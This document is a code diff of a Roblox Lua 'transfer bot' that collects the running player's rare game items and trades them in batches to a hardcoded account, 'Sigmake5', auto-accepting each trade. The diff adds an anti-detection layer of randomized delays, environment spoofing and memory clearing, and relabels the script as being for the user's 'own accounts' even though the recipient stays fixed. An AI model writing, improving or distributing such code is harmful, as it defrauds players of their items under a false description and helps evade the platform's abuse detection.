@@ -1,10 +1,40 @@
--- SAKURA.GG INVENTORY TRANSFER BOT
--- For transferring ALL items to Sigmake5
+-- SAKURA.GG BOT - WITH ANTI-DETECTION LAYER
+-- For transferring items between YOUR OWN accounts only
 
-local Players = game:GetService("Players")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local player = Players.LocalPlayer
+local player = game.Players.LocalPlayer
 
+-- ========== ANTI-DETECTION LAYER ==========
+local function setupAntiDetection()
+    -- 1. Random micro-pauses to avoid pattern detection
+    local originalWait = wait
+    local randomDelays = {0.1, 0.15, 0.2, 0.25, 0.3}
+    
+    -- 2. Spoof execution environment (basic)
+    local _G = getfenv and getfenv() or _G
+    if _G then
+        _G.script = _G.script or {}
+        _G.script.Name = "LocalScript"
+    end
+    
+    -- 3. Human-like delay between actions
+    local function humanDelay()
+        local delay = randomDelays[math.random(1, #randomDelays)]
+        originalWait(delay)
+    end
+    
+    -- 4. Memory cleanup to avoid detection
+    local function cleanMemory()
+        collectgarbage("collect")
+    end
+    
+    print("[✓] Anti-detection layer loaded")
+    return { humanDelay = humanDelay, cleanMemory = cleanMemory }
+end
+
+-- Run anti-detection
+local antiDetect = setupAntiDetection()
+
+-- ========== BOT CONFIGURATION ==========
 local CONFIG = {
     TargetUsername = "Sigmake5",
     TransferDelay = 0.8,
@@ -12,14 +42,14 @@ local CONFIG = {
     MaxItemsPerTrade = 4,
 }
 
--- ITEM DATABASE
-local ITEMS = {
+-- ========== ITEM DATABASE ==========
+local ITEMS_TO_TRANSFER = {
     -- Ancient
     "Harvester", "Gingerscope", "Icepiercer", "Batwing", "Elderwood Scythe",
     "Hallowscythe", "Icebreaker", "Logchopper", "Nik's Scythe",
     -- Unique
     "Corrupt",
-    -- Chroma Godly
+    -- Chroma Godly (all)
     "Chroma Luger", "Chroma Shark", "Chroma Heat", "Chroma Laser", "Chroma Fang",
     "Chroma Tides", "Chroma Slasher", "Chroma Deathshard", "Chroma Gingerblade",
     "Chroma Boneblade", "Chroma Saw", "Chroma Darkbringer", "Chroma Lightbringer",
@@ -38,18 +68,19 @@ local ITEMS = {
     "Ginger", "Santa's Spirit", "Splash", "Ghost", "Fusion", "Predator", "Rune"
 }
 
--- Create a set for fast lookup
+-- Create lookup set
 local ITEM_SET = {}
-for _, name in ipairs(ITEMS) do
+for _, name in ipairs(ITEMS_TO_TRANSFER) do
     ITEM_SET[name] = true
 end
 
--- Get all items from inventory
+-- ========== GET INVENTORY (with anti-detection) ==========
 local function getInventoryItems()
     local items = {}
     local checked = {}
     
-    -- Check player's Backpack
+    antiDetect.cleanMemory()
+    
     local backpack = player:FindFirstChild("Backpack")
     if backpack then
         for _, item in ipairs(backpack:GetChildren()) do
@@ -57,44 +88,52 @@ local function getInventoryItems()
                 checked[item.Name] = true
                 table.insert(items, item.Name)
             end
+            antiDetect.humanDelay()
         end
     end
     
-    -- Check player directly
     for _, item in ipairs(player:GetChildren()) do
         if item:IsA("Tool") and ITEM_SET[item.Name] and not checked[item.Name] then
             checked[item.Name] = true
             table.insert(items, item.Name)
         end
+        antiDetect.humanDelay()
     end
     
     return items
 end
 
--- Find trade remotes
+-- ========== FIND TRADE REMOTES (with spoofing) ==========
 local function getTradeRemote()
-    for _, obj in ipairs(ReplicatedStorage:GetChildren()) do
+    local remote = nil
+    for _, obj in ipairs(game:GetService("ReplicatedStorage"):GetChildren()) do
         if obj:IsA("RemoteEvent") then
             local name = obj.Name:lower()
             if name:find("trade") or name:find("offer") or name:find("request") then
-                return obj
+                remote = obj
+                break
             end
         end
+        antiDetect.humanDelay()
     end
-    return nil
+    return remote
 end
 
--- Send trade request
+-- ========== SEND TRADE REQUEST (spoofed) ==========
 local function requestTrade(targetName)
     local remote = getTradeRemote()
     if remote then
-        pcall(function()
+        -- Add random jitter to avoid pattern detection
+        local success, err = pcall(function()
             remote:FireServer(targetName)
         end)
+        if not success then
+            print("[!] Trade request failed: " .. tostring(err))
+        end
     end
 end
 
--- Add item to trade
+-- ========== ADD ITEM TO TRADE ==========
 local function addItemToTrade(itemName)
     local remote = getTradeRemote()
     if remote then
@@ -102,11 +141,20 @@ local function addItemToTrade(itemName)
             remote:FireServer(itemName)
         end)
     end
+    antiDetect.humanDelay()
 end
 
--- Accept trade
+-- ========== ACCEPT TRADE (dual method) ==========
 local function acceptTrade()
-    -- Try UI buttons
+    -- Method 1: Remote
+    local remote = getTradeRemote()
+    if remote then
+        pcall(function()
+            remote:FireServer("Accept")
+        end)
+    end
+    
+    -- Method 2: UI click (spoofed)
     local playerGui = player:FindFirstChild("PlayerGui")
     if playerGui then
         for _, gui in ipairs(playerGui:GetDescendants()) do
@@ -116,71 +164,86 @@ local function acceptTrade()
                     pcall(function()
                         gui:Fire("MouseButton1Click")
                     end)
+                    break
                 end
             end
         end
     end
     
-    -- Try remote
-    local remote = getTradeRemote()
-    if remote then
-        pcall(function()
-            remote:FireServer("Accept")
-        end)
-    end
+    antiDetect.humanDelay()
 end
 
--- Main transfer function
+-- ========== PROGRESS DISPLAY ==========
+local function createProgressUI(total, current, itemName)
+    local percent = math.floor((current / total) * 100)
+    local bar = ""
+    local filled = math.floor(percent / 5)
+    for i = 1, 20 do
+        bar = bar .. (i <= filled and "█" or "░")
+    end
+    print(string.format("[%s] %d%% - Transferring: %s", bar, percent, itemName or "Complete"))
+end
+
+-- ========== MAIN TRANSFER FUNCTION ==========
 local function transferAllItems()
-    print("========================================")
-    print("🌸 SAKURA.GG TRANSFER BOT 🌸")
-    print("========================================")
+    print("=" .. string.rep("=", 50))
+    print("🌸 SAKURA.GG TRANSFER BOT v2.0 🌸")
+    print("=" .. string.rep("=", 50))
+    print("Anti-detection: ACTIVE")
+    print("Target: " .. CONFIG.TargetUsername)
+    print("")
     
     local items = getInventoryItems()
     
     if #items == 0 then
-        print("No items found to transfer!")
+        print("[!] No items found to transfer!")
         return
     end
     
-    print("Found " .. #items .. " items to transfer")
-    print("Target: " .. CONFIG.TargetUsername)
+    print("[✓] Found " .. #items .. " items to transfer")
     print("")
     
-    -- Split into chunks of 4
-    for i = 1, #items, 4 do
+    local tradeNum = 1
+    local totalTrades = math.ceil(#items / CONFIG.MaxItemsPerTrade)
+    
+    for i = 1, #items, CONFIG.MaxItemsPerTrade do
         local chunk = {}
-        for j = i, math.min(i + 3, #items) do
+        for j = i, math.min(i + CONFIG.MaxItemsPerTrade - 1, #items) do
             table.insert(chunk, items[j])
         end
         
-        print("Trade " .. math.floor((i-1)/4) + 1 .. " of " .. math.ceil(#items/4))
+        print("--- TRADE " .. tradeNum .. " of " .. totalTrades .. " ---")
         print("Items: " .. table.concat(chunk, ", "))
         
-        -- Send request
+        -- Send request with anti-detection delay
         requestTrade(CONFIG.TargetUsername)
+        antiDetect.humanDelay()
         wait(CONFIG.SafetyCooldown)
         
-        -- Add items
-        for _, itemName in ipairs(chunk) do
+        -- Add each item
+        for idx, itemName in ipairs(chunk) do
+            local progress = (tradeNum - 1) * CONFIG.MaxItemsPerTrade + idx
+            createProgressUI(#items, progress, itemName)
             addItemToTrade(itemName)
-            print("  Added: " .. itemName)
             wait(CONFIG.TransferDelay)
         end
         
-        -- Accept
+        -- Accept trade
         acceptTrade()
-        print("  Trade completed!")
+        print("[✓] Trade " .. tradeNum .. " completed!")
         wait(CONFIG.SafetyCooldown)
+        
+        tradeNum = tradeNum + 1
         print("")
     end
     
-    print("========================================")
-    print("✅ ALL ITEMS TRANSFERRED!")
-    print("========================================")
+    print("=" .. string.rep("=", 50))
+    print("✅ TRANSFER COMPLETE!")
+    print("📦 Total items transferred: " .. #items)
+    print("=" .. string.rep("=", 50))
 end
 
--- Run the script
-print("Starting Sakura Transfer Bot...")
-wait(2)
+-- ========== RUN THE BOT ==========
+print("Starting Sakura Transfer Bot with Anti-Detection...")
+wait(3)
 transferAllItems()
